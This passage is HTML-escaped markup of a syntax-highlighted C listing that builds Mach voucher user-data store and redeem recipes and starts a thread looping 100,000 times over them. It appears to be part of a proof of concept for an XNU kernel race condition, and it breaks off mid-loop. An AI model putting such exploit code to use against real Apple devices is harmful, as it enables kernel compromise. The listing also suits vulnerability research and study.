 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_buf &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_buf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;template_size_out &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;static&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;create_single_variable_userdata_then_redeem_voucher_recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;size_t len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;size_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;template_size_out&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;calloc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_USER_DATA_STORE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_size &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; uint8_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;content_buf &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_buf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;buf&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe2 &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;mach_voucher_attr_recipe_data_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;content_buf &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;len&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;);&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe2&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;key &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_KEY_USER_DATA&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; recipe2&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;command &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;MACH_VOUCHER_ATTR_REDEEM&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;template_size_out &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_template_meta &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; size_t recipe_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_template_meta single_recipe_template &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_template_meta redeem_recipe_template &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{};&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iter_limit &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;100000&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;s3threadfunc&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;arg&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_template_meta&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;template&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;recipe_template_meta&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;*)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;arg&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;iter_limit&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;++)&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span 